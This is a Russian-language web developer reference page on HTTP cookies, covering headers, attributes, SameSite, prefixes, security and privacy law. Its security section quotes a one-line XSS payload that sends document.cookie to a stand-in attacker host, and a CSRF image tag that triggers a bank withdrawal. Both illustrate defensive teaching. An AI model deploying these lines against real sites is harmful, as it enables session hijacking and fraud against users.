---
title: HTTP-куки
slug: Web/HTTP/Guides/Cookies
---

HTTP cookie (web cookie, куки браузера) - это небольшой фрагмент данных, который сервер отправляет браузеру пользователя. Браузер может сохранить этот фрагмент у себя и отправлять на сервер с каждым последующим запросом. Это, в частности, позволяет узнать, с одного ли браузера пришли несколько запросов (например, для аутентификации пользователя). С помощью кук можно сохранить любую информацию о состоянии, HTTP-протокол сам по себе этого делать не умеет.

Куки часто используются для:

- Управления сеансом (логины, корзины для виртуальных покупок)
- Персонализации (пользовательские предпочтения)
- Трекинга (отслеживания поведения пользователей)

До недавнего времени куки использовались в качестве хранилища информации на стороне пользователя. Это могло иметь смысл в отсутствии вариантов, но теперь, когда в распоряжении браузеров появились различные API для хранения данных, это уже не так. Из-за того что куки пересылаются с каждым запросом, они могут ухудшать производительность (особенно при использовании мобильных сетей). В качестве хранилищ данных на стороне пользователя вместо них можно использовать [Web storage API](/ru/docs/Web/API/Web_Storage_API) (`localStorage` и `sessionStorage`) и [IndexedDB](/ru/docs/Web/API/IndexedDB_API).

> [!NOTE]
> Чтобы посмотреть сохранённые куки и другие хранилища данных, которые использует веб-страница, можно использовать [Storage Inspector](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html) (Инспектор хранилища) в инструментах разработчика.

## Создание куки

Получив HTTP-запрос, вместе с ответом сервер может отправить заголовок {{HTTPHeader("Set-Cookie")}}. Куки обычно запоминаются браузером и посылаются в HTTP-заголовке {{HTTPHeader("Cookie")}} с каждым новым запросом к одному и тому же серверу. Можно задать срок действия кук, а также срок их жизни, после которого куки не будут отправляться. Также можно указать ограничения на путь и домен, то есть указать, в течении какого времени и к какому сайту они будут отсылаться.

### Заголовки `Set-Cookie` и `Cookie`

Заголовок {{HTTPHeader("Set-Cookie")}} HTTP-ответа используется для отправки куки с сервера в клиентское приложение (браузер). Простой куки может задаваться так:

```
Set-Cookie: <имя-куки>=<заголовок-куки>
```

Этот заголовок с сервера даёт клиенту указание сохранить куки (это делают, например, [PHP](http://php.net/manual/en/function.setcookie.php), [Node.js](https://nodejs.org/dist/latest-v6.x/docs/api/http.html#http_response_setheader_name_value), [Python](https://docs.python.org/3/library/http.cookies.html) и [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)). Ответ, отправляемый браузеру, содержит заголовок `Set-Cookie`, и куки запоминается браузером.

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

Теперь с каждым новым запросом к серверу при помощи заголовка {{HTTPHeader("Cookie")}} браузер будет возвращать серверу все сохранённые ранее куки.

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

### Сессионные cookie

Простой cookie, пример которого приведён выше, представляет собой сессионный _cookie_ (_session cookie_) - такие cookie удаляются при закрытии клиента, то есть существуют только на протяжении текущего сеанса, поскольку атрибуты `Expires` или `Max-Age` для него не задаются. Однако, если в браузере включено автоматическое восстановление сеанса, что случается очень часто, cookie сеанса может храниться постоянно, как если бы браузер никогда не закрывался.

### Постоянные cookies

_Постоянные cookie_ (_permanent cookies_) удаляются не с закрытием клиента, а при наступлении определённой даты (атрибут `Expires`) или после определённого интервала времени (атрибут `Max-Age`).

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

### `Secure` ("безопасные") и `HttpOnly` куки

"Безопасные" (secure) куки отсылаются на сервер только тогда, когда запрос отправляется по протоколу SSL и HTTPS. Однако важные данные никогда не следует передавать или хранить в куках, поскольку сам их механизм весьма уязвим в отношении безопасности, а флаг `secure` никакого дополнительного шифрования или средств защиты не обеспечивает. Начиная с Chrome 52 и Firefox 52, незащищённые сайты (http:) не могут создавать куки с флагом `Secure`.

Куки HTTPonly не доступны из JavaScript через свойства {{domxref("Document.cookie")}} API, что помогает избежать межсайтового скриптинга ({{Glossary("XSS")}}). Устанавливайте этот флаг для тех кук, к которым не требуется обращаться через JavaScript. В частности, если куки используются только для поддержки сеанса, то в JavaScript они не нужны, так что в этом случае следует устанавливать флаг `HttpOnly`.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### Область видимости куки

Директивы `Domain` и `Path` определяют область видимости куки, то есть те URL-адреса, к которым куки будут отсылаться.

#### Атрибут Domain

Атрибут `Domain` указывает хосты, на которые отсылаются куки. Если он не задан, то по умолчанию берётся доменная часть адреса документа (но без поддоменов). Если домен указан явно, то поддомены всегда включены.

Например, если задано `Domain=mozilla.org`, то куки включены и в поддоменах, например, в `developer.mozilla.org`.

#### Атрибут Path

Атрибут `Path` указывает URL, который должен быть в запрашиваемом ресурсе на момент отправки заголовка `Cookie`. Символ %x2F ("/") интерпретируется как разделитель в URL-пути, подпути также будут учитываться.

Если задан `Path=/docs`, то совпадать будут следующие пути:

- `/docs`
- `/docs/`
- `/docs/Web/`
- `/docs/Web/HTTP`

А эти пути совпадать не будут:

- `/`
- `/docsets`
- `/fr/docs`

#### Куки `SameSite`

Куки отправляются на сервер при любых запросах, даже если запрашивается статический ресурс с чужого сервера, то есть если происходит межсайтовый запрос. Например, если страница сайта site.com содержит изображение сайта site.net, при запросе изображения в запросе будут отправлены все куки пользователя для site.net. Чтобы ограничить отправку кук только тому сайту, которому они принадлежат, используют атрибут SameSite.

C помощью атрибута `SameSite` можно указать, когда и как отправлять куки с межсайтовыми запросами (где сайт определяется комбинацией домена и схемы `http:` или `https:`). В некоторой степени этот атрибут защищает от межсайтовой подделки запроса ({{Glossary("CSRF")}}). `SameSite` может принимать три возможных значения: `Strict`, `Lax` и `None`.

С атрибутом `Strict` куки будут отправляться только тому сайту, которому эти куки принадлежат. Атрибут `Lax` работает похоже, но куки будут отправляться также при навигации на тот сайт, которому принадлежат куки. Например, при переходе по ссылке с внешнего сайта. Атрибут `None` отключает ограничение на отправку кук для межсайтовых запросов, но только в безопасном контексте (то есть если установлен `SameSite=None`, тогда также должен быть установлен атрибут `Secure`). Если атрибут `SameSite` не установлен, куки будут восприниматься как `Lax`.

Пример:

```js
Set-Cookie: mykey=myvalue; SameSite=Strict
```

> [!NOTE]
> В [таблице совместимости](/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value#browser_compatibility) вы можете найти информацию о том, как обрабатываются атрибуты в конкретных версиях браузеров.

#### Куки с префиксами

Из-за дизайна механизма кук сервер не может подтвердить, что куки были отправлены с защищённого источника (secure origin), или быть уверенным в том, где именно они были установлены.

Уязвимое приложение поддомена может установить куку с атрибутом `Domain`, тем самым открывая к ней доступ на всех других поддоменнах. Этот механизм может эксплуатироваться с атакой _фиксация сессии_.

> [!NOTE]
> Ознакомьтесь со статьёй [фиксация сессии](/ru/docs/Web/Security/Types_of_attacks#session_fixation), чтобы узнать об основных методах защиты от этой атаки.

Тем не менее в соответствии с принципом [защита в глубину](<https://en.wikipedia.org/wiki/Defense_in_depth_(computing)>) вы можете использовать _куки с префиксами_, чтобы гарантировать специфические факты о куках. Доступны два префикса:

- `__Host-`
  - : Если в куке содержится этот префикс, она будет установлена заголовком {{HTTPHeader("Set-Cookie")}} только в том случае, если кука будет содержать атрибут `Secure` и если запрос будет отправляться из защищённого источника. Также кука не должна включать атрибут `Domain` и должна содержать атрибут `Path` со значением `/`.
- `__Secure-`
  - : Если в куке содержится этот префикс, она будет установлена заголовком {{HTTPHeader("Set-Cookie")}} только в том случае, если кука будет содержать атрибут `Secure` и если запрос будет отправляться из защищённого источника. Защита с помощью этого префикса слабее по сравнению с префиксом `__Host-`.

Браузеры будут отклонять установку этих кук, если они не будут удовлетворять всем ограничениям. Заметьте, что куки с префиксами, созданные в рамках поддомена, будут ограничиваться только им или будут полностью игнорироваться. Так как бэкенд проверяет только куки с заранее известными именами при авторизации пользователя или валидации CSRF-токена, куки с префиксами фактически работают как защитный механизм от фиксации сессии.

> [!NOTE]
> Бэкенд веб-приложения _обязан_ обращаться по полному имени куки, включая префикс. Пользовательские агенты не удаляют префикс из имени кук перед их отправкой в HTTP-заголовке {{HTTPHeader('Cookie')}}.

Для получения информации о статусе поддержки префиксов в разных браузерах обратитесь к статье про {{HTTPHeader("Set-Cookie")}}.

#### Доступ из JavaScript с помощью `Document.cookie`

Куки можно создавать с помощью JavaScript, используя DOM-свойство {{domxref("Document.cookie")}}. Также можно читать куки из JavaScript, если не был установлен атрибут `HttpOnly`.

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// выведет "yummy_cookie=choco; tasty_cookie=strawberry"
```

Куки, созданные с помощью JavaScript, не могут содержать атрибут `HttpOnly`.

Пожалуйста, учитывайте вытекающие из этого проблемы, про которые рассказывается ниже в разделе [Безопасность](#безопасность). Куки, доступные для JavaScript, могут быть похищены посредством XSS.

## Безопасность

> [!NOTE]
> При сохранении информации в куках имейте в виду, что у всех пользователей есть возможность просматривать и изменять их значения. В зависимости от типа приложения вы можете использовать ни о чём не говорящее имя для идентификатора кук, смысл которого будет понятен только бэкенду. Также вы можете рассмотреть возможность использования альтернативных механизмов аутентификации и конфиденциальности, например, JSON Web Tokens

Способы предотвращения атак, использующих куки:

- Используйте атрибут `HttpOnly` для предотвращения доступа к кукам из JavaScript.
- Куки, которые используются для хранения чувствительной информации, такой как аутентификационный токен, должны иметь короткое время жизни и атрибут `SameSite`, установленный в `Strict` или `Lax`. Для того чтобы узнать больше, смотрите раздел [SameSite](#куки_samesite). В [браузерах с поддержкой SameSite](<браузерах с поддержкой SameSite>) это гарантирует предотвращение отправки кук аутентификации с межсайтовыми запросами, фактически такие запросы с точки зрения бэкенда становятся неаутентифицированными.

### Захват сессии (session hijacking) и XSS

Куки часто используются в веб-приложениях для идентификации аутентифицированного пользователя и сеанса работы. Соответственно, похищение кук из приложения может привести к захвату авторизованного сеанса пользователя. Кража кук часто осуществляется посредством социальной инженерии (Social Engineering) и использования уязвимости {{Glossary("XSS")}}.

```js
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

Атрибут HttpOnly помогает уменьшить эту угрозу, перекрывая доступ к кукам из JavaScript.

### Межсайтовая подделка запроса (CSRF - Cross-site request forgery)

В [Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) есть хороший пример {{Glossary("CSRF")}}. В сообщение, например, в чате или на форуме, включают "изображение", которое, на самом деле, представляет собой запрос к серверу банка на снятие денег:

```html
<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
```

Если вы аутентифицированны в своём банковском аккаунте, а куки по-прежнему действительны (и никакой дополнительной проверки не требуется), то при загрузке HTML-документа форума или чата с этим изображением деньги будут переведены с вашего счета. Для защиты от этого используется ряд методов:

- Как и при {{Glossary("XSS")}}, важна фильтрация входящей информации.
- Для любой чувствительной операции должно запрашиваться подтверждение.
- Куки, используемые для чувствительных операций, должны иметь короткий срок действия.
- Дополнительную информацию можно получить в пользовательской инструкции по предотвращению [CSRF](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>) на сайте OWASP.

## Трекинг и приватность

### Сторонние (Third-party) куки

Куки ассоциируются с определённым доменом и схемой (такой как `http:` или `https:`). Также они могут быть ассоциированы с поддоменом с помощью атрибута `Domain`. Если домен и схема кук совпадает с доменом и схемой текущей страницы, на которой вы находитесь, то их называют _собственными куками_ (_first-party cookies_). Если домен и схема кук отличается от домена и схемы текущей страницы, то такие куки называют _сторонними куками_ (_third-party cookies_).

Сервер, хостящий страницу, устанавливает собственные куки, но на странице могут находиться изображения и другие компоненты с других доменов (например, баннерная реклама), они в свою очередь могут устанавливать сторонние куки. Сторонние куки часто используются для рекламы и трекинга пользователей в сети. Как пример, можете посмотреть куки, которые [устанавливает Google](https://policies.google.com/technologies/cookies#types-of-cookies).

Третья сторона, контролирующая внедрение сторонних кук, может создать профиль пользователя на основе истории его посещений разных сайтов с помощью кук, отправляемых одним и тем же браузером с разных сайтов. Firefox по умолчанию блокирует сторонние куки, про которые известно, что они используются для трекинга пользователей. Сторонние куки (или просто куки для трекинга) могут также быть заблокированы другими настройками браузера или расширениями. Блокировка кук в некоторых ситуациях может стать причиной некорректного поведения сторонних компонентов, например, виджетов социальных сетей.

> [!NOTE]
> Бэкенд может (и должен) устанавливать у кук [атрибут SameSite](/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value) для управления отправкой кук на сторонние серверы.

### Законодательство, связанное с куки

Регулирующие акты и законодательство, покрывающие куки, включают:

- General Data Privacy Regulation (GDPR) в Европейском Союзе
- ePrivacy Directive в Европейском Союзе
- California Consumer Privacy Act в Штате Калифорния

Эти акты и директивы действуют глобально. Они применяются ко всем сайтам во Всемирной паутине, к которым пользователи из данных юрисдикций получают доступ (Европейский Союз и Калифорния, с оговоркой, что Калифорнийский закон применяется к компаниям с доходом выше 25 миллионов долларов и несколькими другими оговорками).

Эти акты и директивы включают такие требования как:

- Сообщать пользователям, что сайт использует куки.
- Давать возможность пользователям отказываться от получения всех или некоторых кук.
- Давать возможность пользователям использовать основные функции вашего сервиса без получения кук.

Могут существовать другие законодательные акты, которые применимы к вашей локальной юрисдикции. На вас лежит ответственность знать про них и следовать им. Существуют компании, которые предлагают код с "куки баннером" и берут на себя заботы о следовании законодательству, связанному с куками.

## Другие способы хранения информации в браузере

Другой способ для хранения данных в браузере — [Web Storage API](/ru/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API). Свойства [window.sessionStorage](/ru/docs/Web/API/Window/sessionStorage) и [window.localStorage](/ru/docs/Web/API/Window/localStorage) подобны сессионным и постоянным кукам, но позволяют хранить больше данных и никогда не отправляются на сервер. Для хранения ещё большего объёма структурированных данных может использоваться [IndexedDB API](/ru/docs/Web/API/IndexedDB_API) или библиотеки, построенные поверх него.

Существуют техники для повторной установки кук после их удаления. Такие куки называются куки-зомби. Эти техники нарушают принципы приватности пользователей и пользовательского контроля и могут нарушать законодательства, регулирующие приватность данных, соответственно, использующий их сайт подвержен судебному разбирательству.

## Смотрите также

- {{HTTPHeader("Set-Cookie")}}
- {{HTTPHeader("Cookie")}}
- {{domxref("Document.cookie")}}
- {{domxref("Navigator.cookieEnabled")}}
- [SameSite cookies](/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value)
- [Inspecting cookies using the Storage Inspector](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html)
- [Cookie specification: RFC 6265](https://datatracker.ietf.org/doc/html/rfc6265)
- [Cookies, the GDPR, and the ePrivacy Directive](https://gdpr.eu/cookies/)
- [HTTP cookie on Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie)
